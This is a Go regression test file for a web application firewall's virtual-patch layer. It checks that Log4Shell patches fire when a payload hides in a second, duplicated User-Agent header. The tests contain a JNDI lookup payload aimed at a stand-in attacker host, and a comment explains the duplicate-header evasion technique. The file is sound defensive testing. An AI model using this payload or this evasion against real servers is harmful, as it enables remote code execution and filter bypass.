package virtualpatch

// Regression tests for round 20/25: getValueByType must expose ALL
// transmitted values for header-scoped pattern types (header/user_agent/
// content_type). Go appends duplicate header lines into the value slice; the
// pre-fix implementation read only vals[0], so a payload riding in any
// non-first value evaded every header-scoped virtual patch — including the
// shipped Log4Shell and Shellshock patches (the round-81 multi-value family,
// unfixed in this layer). The honest contract: a patch must match if ANY
// transmitted value matches.

import (
	"testing"

	"github.com/guardianwaf/guardianwaf/internal/engine"
)

func TestVirtualPatchHeaderMultiValueBypassFixed(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true, BlockSeverity: []string{"CRITICAL"}})

	// The shipped Log4Shell patch matches "${jndi:" in the User-Agent header.
	// Attack: duplicate the header — the clean value first, the payload second.
	ctx := &engine.RequestContext{
		Method: "POST",
		Path:   "/api/login",
		Headers: map[string][]string{
			"User-Agent": {"Mozilla/5.0 (clean)", "${jndi:ldap://attacker.example/x}"},
		},
		BodyString: "username=admin&password=secret",
	}

	result := layer.Process(ctx)

	if result.Action != engine.ActionBlock {
		t.Fatalf("FAIL multi-value-bypass: the Log4Shell patch must fire when the payload rides in the SECOND User-Agent value (action=%v, score=%d)", result.Action, result.Score)
	}
}

func TestVirtualPatchHeaderFirstValueStillBlocked(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true, BlockSeverity: []string{"CRITICAL"}})
	ctx := &engine.RequestContext{
		Method: "POST",
		Path:   "/api/login",
		Headers: map[string][]string{
			"User-Agent": {"${jndi:ldap://attacker.example/x}"},
		},
	}
	result := layer.Process(ctx)
	if result.Action != engine.ActionBlock {
		t.Fatalf("FAIL single-value-broken: the single-value payload must block (action=%v)", result.Action)
	}
}

func TestVirtualPatchCleanUAPasses(t *testing.T) {
	layer := NewLayer(&Config{Enabled: true, BlockSeverity: []string{"CRITICAL"}})
	ctx := &engine.RequestContext{
		Method: "POST",
		Path:   "/api/login",
		Headers: map[string][]string{
			"User-Agent": {"Mozilla/5.0"},
		},
	}
	result := layer.Process(ctx)
	if result.Action == engine.ActionBlock {
		t.Fatalf("FAIL clean-traffic-blocked: action=%v", result.Action)
	}
}
